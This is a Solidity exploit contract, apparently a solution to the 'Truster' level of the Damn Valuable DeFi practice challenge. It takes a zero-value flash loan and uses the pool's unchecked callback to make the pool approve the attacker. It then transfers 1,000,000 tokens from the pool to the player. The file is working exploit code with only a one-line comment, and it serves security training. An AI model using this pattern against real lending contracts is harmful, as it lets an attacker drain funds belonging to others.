// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

// Loan contract - exploit -  loan 0 value and use callback for token approve.

contract Solution2 {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public player;

    constructor(DamnValuableToken token_, TrusterLenderPool pool_) {
        token = token_;
        pool = pool_;
        player = msg.sender;
    }

    function loan() external {
        bytes memory cd = abi.encodeWithSelector(token.approve.selector, address(this), 1000000 ether);
        pool.flashLoan(0, address(this), address(token), cd);

        token.transferFrom(address(pool), player, 1000000 ether);
    }
}